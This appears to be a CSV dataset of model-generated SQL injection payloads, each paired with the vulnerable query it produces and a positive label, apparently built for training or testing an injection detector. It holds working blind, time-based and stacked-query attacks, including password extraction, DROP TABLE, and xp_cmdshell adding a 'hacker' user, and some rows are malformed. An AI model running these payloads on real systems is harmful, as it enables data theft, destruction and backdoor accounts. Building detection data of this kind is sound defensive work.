blind_boolean,search,"1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--","SELECT * FROM products WHERE name LIKE '%1' AND 1 IN (SELECT 1 FROM users WHERE id=1 AND SUBSTRING(name,1,1)=CHAR(97))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--","SELECT * FROM products WHERE name LIKE '%1' AND (SELECT CAST(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1 LIMIT 1),1,1)) AS CHAR) = 'a'--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --,SELECT * FROM products WHERE name LIKE '%--' AND (SELECT 0 FROM product_info WHERE price > (SELECT AVG(price) FROM products)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--","SELECT * FROM products WHERE name LIKE '%/*' AND 1=2 UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='store_db'),NULL--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--","SELECT * FROM products WHERE name LIKE '%' AND ascii(substring((SELECT group_concat(password) FROM user_accounts),1,1))>97--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--","SELECT * FROM products WHERE name LIKE '%%' AND EXISTS(SELECT 1 FROM inventory WHERE item_id LIKE concat('%', (CHAR(98)), '%'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,search,"' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--","SELECT * FROM products WHERE name LIKE '%' AND (SELECT cast(ascii(substring((SELECT product_code FROM orders WHERE order_id=1),1,1)) AS char)=char(99)--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,--' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--,SELECT * FROM users WHERE id = --' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,user_lookup,'; WAITFOR DELAY '0:0:10' AND 1=1; --,SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:10' AND 1=1; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,user_lookup,--' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)=',SELECT * FROM users WHERE id = --' AND (SELECT CASE WHEN 1=1 THEN CAST(ASCII((SELECT username FROM users WHERE id=1)) AS VARCHAR) ELSE NULL END)=',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--","SELECT * FROM users WHERE id = ' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE id=(SELECT IF(SUBSTRING(username, 1, 1)='a', 1, 0)))--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,%' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --,SELECT * FROM users WHERE id = %' AND (SELECT COUNT(*) FROM users WHERE id IN (SELECT id FROM users WHERE username COLLATE utf8mb4_bin LIKE 'a%')) > 0 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --","SELECT * FROM users WHERE id = ' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username ORDER BY id), 1, 1)) & 0x80 > 0 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,user_lookup,"--' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0","SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) & 0x80 > 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'","SELECT * FROM users WHERE id = ' OR 1=1 AND SUBSTR((SELECT password FROM users WHERE id=1), 1, 1)='a'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,--' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0,SELECT * FROM users WHERE id = --' AND (SELECT COUNT(*) FROM users WHERE username LIKE '_%' AND LENGTH(username)=2)>0,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"--' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0","SELECT * FROM users WHERE id = --' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(id, username) FROM users WHERE id=1), 1, 1)) & 0x80 > 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,user_lookup,"' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'","SELECT * FROM users WHERE id = ' AND (SELECT IF(SUM(CASE WHEN username LIKE 'admin%' THEN 1 ELSE 0 END), 'true', 'false') FROM users)='true'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,1; WAITFOR DELAY '0:0:5';--,SELECT * FROM orders WHERE status = '1; WAITFOR DELAY '0:0:5';--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,order_filter,1' LIKE '1'%,SELECT * FROM orders WHERE status = '1' LIKE '1'%' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,order_filter,/*'*/AND 1=1 /*comment*/,SELECT * FROM orders WHERE status = '/*'*/AND 1=1 /*comment*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND 1=1 OR 1=1 --,SELECT * FROM orders WHERE status = '' AND 1=1 OR 1=1 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND (SELECT 1 FROM users WHERE username = '') = 1,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = '') = 1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --,SELECT * FROM orders WHERE status = '' AND 1<>(CASE WHEN (SELECT COUNT(*) FROM users WHERE id = 1) THEN 1 ELSE 0 END) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,order_filter,' LIKE '%admin%',SELECT * FROM orders WHERE status = '' LIKE '%admin%'' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,/*'*/ AND 1=1 /*comment*/,SELECT * FROM orders WHERE status = '/*'*/ AND 1=1 /*comment*/' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,AND EXISTS(SELECT * FROM users WHERE status = 'active') --,SELECT * FROM orders WHERE status = 'AND EXISTS(SELECT * FROM users WHERE status = 'active') --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,order_filter,OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END),SELECT * FROM orders WHERE status = 'OR (SELECT 1 UNION ALL SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,"["";--"", ""--;"", """"""', 1)"", ""/*'""]), (""1'/*"", ""1'))""), (""1'#"", "";--""), (""1' OR '1'='1"", ""--;""], (""1'; DROP TABLE users --"", ""1') UNION SELECT NULL, NULL--"")]","INSERT INTO comments (user_id, body) VALUES (1, '["";--"", ""--;"", """"""', 1)"", ""/*'""]), (""1'/*"", ""1'))""), (""1'#"", "";--""), (""1' OR '1'='1"", ""--;""], (""1'; DROP TABLE users --"", ""1') UNION SELECT NULL, NULL--"")]')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,comment_insert,1' AND EXISTS (SELECT * FROM users WHERE 1=1),"INSERT INTO comments (user_id, body) VALUES (1, '1' AND EXISTS (SELECT * FROM users WHERE 1=1)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,comment_insert,1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1'); WAITFOR DELAY '0:0:5' AND ('%,"INSERT INTO comments (user_id, body) VALUES (1, '1'); WAITFOR DELAY '0:0:5' AND ('%')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1' XOR 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '1' XOR 1=1 --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,comment_insert,1' LIKE '%' --,"INSERT INTO comments (user_id, body) VALUES (1, '1' LIKE '%' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,'; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:3' IF USER_ID() = 1;--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,1')) AND SLEEP(5) AND (1=1 --,SELECT * FROM users WHERE username = '1')) AND SLEEP(5) AND (1=1 --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #","SELECT * FROM users WHERE username = '' OR 1>1 UNION ALL SELECT NULL, NULL, NULL FROM DUAL #' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"'); BENCHMARK(1000000, md5('123')) AND ('1'='1","SELECT * FROM users WHERE username = ''); BENCHMARK(1000000, md5('123')) AND ('1'='1' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,login,"/*'*/and benchmark(1000000,'a');--","SELECT * FROM users WHERE username = '/*'*/and benchmark(1000000,'a');--' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --,SELECT * FROM users WHERE username = '')); IF OBJECT_ID('tempdb..#t') IS NULL CREATE TABLE #t(x INT); INSERT INTO #t VALUES(1); DECLARE @x INT = (SELECT COUNT(*) FROM #t); IF @x > 0 WAITFOR DELAY '0:0:@x'; --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,""")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --","SELECT * FROM users WHERE username = '"")) AND DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5)=DBMS_PIPE.RECEIVE_MESSAGE(DBMS_CRYPTO.HASH_TO_RAW('attack',DBMS_CRYPTO.HASH_SH256),5) --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,login,'; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:2' IF EXISTS(SELECT 1 FROM users WHERE username LIKE 'admin') --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,"1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --","SELECT * FROM users WHERE username = '1' OR ASCII(SUBSTRING(username, 1, 1)) > 97 AND BENCHMARK(1000000, ' ') --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,' OR 1=1 AND SLEEP(2) AND '%'='%,SELECT * FROM users WHERE username = '' OR 1=1 AND SLEEP(2) AND '%'='%' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,login,/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --,SELECT * FROM users WHERE username = '/*'*/AND ( SELECT 1 FROM information_schema.tables WHERE table_schema = DATABASE() AND table_name = 'users' ) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') = 1 --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,"1""; WAITFOR DELAY '0:0:10'; --","SELECT * FROM products WHERE name LIKE '%1""; WAITFOR DELAY '0:0:10'; --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --,SELECT * FROM products WHERE name LIKE '%1' OR 1=1; IF (CHAR_LENGTH(SELECT 1))=1 THEN SLEEP(5); --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,search,' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --","SELECT * FROM products WHERE name LIKE '%' OR (CAST(SUBSTRING((SELECT version()), 1, 1) AS UNSIGNED) > 5) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' AND (BENCHMARK(1000000, (SELECT 1))) --","SELECT * FROM products WHERE name LIKE '%' AND (BENCHMARK(1000000, (SELECT 1))) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,""" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --","SELECT * FROM products WHERE name LIKE '%"" OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='database_name' AND table_name='users') --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,"' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --","SELECT * FROM products WHERE name LIKE '%' OR (ASCII(SUBSTRING((SELECT user()), 1, 1)) = 97) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,search,' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --,SELECT * FROM products WHERE name LIKE '%' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 1/0 END --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = (SELECT ASCII('a')) --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"--' OR BENCHMARK(1000000, SELECT 1) --'","SELECT * FROM products WHERE name LIKE '%--' OR BENCHMARK(1000000, SELECT 1) --'%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,search,"' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --","SELECT * FROM products WHERE name LIKE '%' UNION SELECT NULL, NULL, NULL, BENCHMARK(1000000, CONCAT(user(), ':', host())) FROM mysql.user --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,' OR 1=1 AND SLEEP(5),SELECT * FROM users WHERE id = ' OR 1=1 AND SLEEP(5),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,user_lookup,"-- OR 1=1 AND BENCHMARK(1000000,MD5('a'))","SELECT * FROM users WHERE id = -- OR 1=1 AND BENCHMARK(1000000,MD5('a'))",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,user_lookup,' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5),SELECT * FROM users WHERE id = ' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 AND SLEEP(5),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"-- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'","SELECT * FROM users WHERE id = -- OR (SELECT BENCHMARK(1000000,'sha1(a')) = 1 AND '1' = '1'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#","SELECT * FROM users WHERE id = ' OR '1' = '1' UNION ALL SELECT NULL, (SELECT USER()), NULL, NULL#",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0","SELECT * FROM users WHERE id = ' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) >= 0",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,"' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)","SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE id>0 AND (SELECT ASCII(SUBSTRING(PASSWORD,1,1)) FROM users LIMIT 1) > 0 AND SLEEP(5)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,user_lookup,' OR 2=2; WAITFOR DELAY '0:0:5',SELECT * FROM users WHERE id = ' OR 2=2; WAITFOR DELAY '0:0:5',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,"'; SELECT benchmark(1000000,'md5(a'))--","SELECT * FROM users WHERE id = '; SELECT benchmark(1000000,'md5(a'))--",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,user_lookup,"' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)","SELECT * FROM users WHERE id = ' OR 4=4 AND EXISTS(SELECT * FROM users WHERE id<0 AND (SELECT ord(mid(password,1,1)) FROM users LIMIT 1) < 123)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,' OR (SELECT 1 FROM users WHERE username = 'admin') -- ',SELECT * FROM orders WHERE status = '' OR (SELECT 1 FROM users WHERE username = 'admin') -- '' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,/* WAITFOR DELAY '0:0:5' */ AND 1=1,SELECT * FROM orders WHERE status = '/* WAITFOR DELAY '0:0:5' */ AND 1=1' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,"BENCHMARK(1000000, SHA2('payload', 256)) --","SELECT * FROM orders WHERE status = 'BENCHMARK(1000000, SHA2('payload', 256)) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,order_filter,"' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --","SELECT * FROM orders WHERE status = '' AND IF((SELECT ASCII(SUBSTRING(status, 1, 1)) FROM orders WHERE id=1), SLEEP(5), NULL) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'=',SELECT * FROM orders WHERE status = '' AND EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,"' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #","SELECT * FROM orders WHERE status = '' UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) WHERE 1=(SELECT Sleep(3)) #' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username='testuser')) = 0 AND '%'='%' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,order_filter,' AND (SELECT 1 FROM users WHERE username = 'admin') --,SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM users WHERE username = 'admin') --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,"' OR (SELECT benchmark(1000000, sha2('payload', 256))) --","SELECT * FROM orders WHERE status = '' OR (SELECT benchmark(1000000, sha2('payload', 256))) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,order_filter,' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'=',SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM orders WHERE status LIKE '%admin%') AND '%'='' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --","INSERT INTO comments (user_id, body) VALUES (1, 'AND DBMS_PIPE.RECEIVE_MESSAGE('BOE', 5) FROM DUAL --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,comment_insert,WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, 'WAITFOR DELAY '0:0:5' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_time,comment_insert,"-- OR BENCHMARK(1000000, MD5('test'))","INSERT INTO comments (user_id, body) VALUES (1, '-- OR BENCHMARK(1000000, MD5('test'))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_time,comment_insert,; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin',"INSERT INTO comments (user_id, body) VALUES (1, '; WAITFOR DELAY '0:0:5' WHERE USER() LIKE 'admin'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))","INSERT INTO comments (user_id, body) VALUES (1, '-- + AND EXISTS(SELECT * FROM sysobjects WHERE id = object_id(N'dbo.sysusers') AND type IN (N'SU', N'G'))')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_time,comment_insert,"' OR 1=1 -- ""; EXEC xp_cmdshell 'ping -n 5 localhost'","INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 -- ""; EXEC xp_cmdshell 'ping -n 5 localhost'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,login,"; WAITFOR DELAY '0:0:10'; --""","SELECT * FROM users WHERE username = '; WAITFOR DELAY '0:0:10'; --""' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,login,"OR '1'='1"";","SELECT * FROM users WHERE username = 'OR '1'='1"";' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,login,"); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --","SELECT * FROM users WHERE username = '); INSERT INTO sessions (username, token) VALUES ('admin', 'hacked'); --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,login,;--',SELECT * FROM users WHERE username = ';--'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,login,1 OR 'a'='a',SELECT * FROM users WHERE username = '1 OR 'a'='a'' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,login,OR 'a'='a,SELECT * FROM users WHERE username = 'OR 'a'='a' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,login,' AND  ( SELECT NULL FROM dual ) --,SELECT * FROM users WHERE username = '' AND  ( SELECT NULL FROM dual ) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,search,; WAITFOR DELAY '0:0:5' AND (SELECT 1=1),SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT 1=1)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,search,; EXEC xp_cmdshell 'whoami',SELECT * FROM products WHERE name LIKE '%; EXEC xp_cmdshell 'whoami'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,search,' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin') --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,search,'/* DROP TABLE products */',SELECT * FROM products WHERE name LIKE '%'/* DROP TABLE products */'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,search,'-- DROP TABLE products',SELECT * FROM products WHERE name LIKE '%'-- DROP TABLE products'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,1')); WAITFOR DELAY '0:0:10'; --,SELECT * FROM users WHERE id = 1')); WAITFOR DELAY '0:0:10'; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,user_lookup,1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --,SELECT * FROM users WHERE id = 1'); EXECUTE master..xp_cmdshell 'net user hacker P@ssw0rd /add'; --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
stacked_queries,user_lookup,1;/**/ALTER USER admin IDENTIFIED BY 'newPassword',SELECT * FROM users WHERE id = 1;/**/ALTER USER admin IDENTIFIED BY 'newPassword',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
stacked_queries,user_lookup,"[""1')) -- ; DROP TABLE users;""","SELECT * FROM users WHERE id = [""1')) -- ; DROP TABLE users;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1'); DELETE FROM users LIMIT 1;""","SELECT * FROM users WHERE id = 1'); DELETE FROM users LIMIT 1;""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
stacked_queries,user_lookup,"1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');""","SELECT * FROM users WHERE id = 1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');""",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
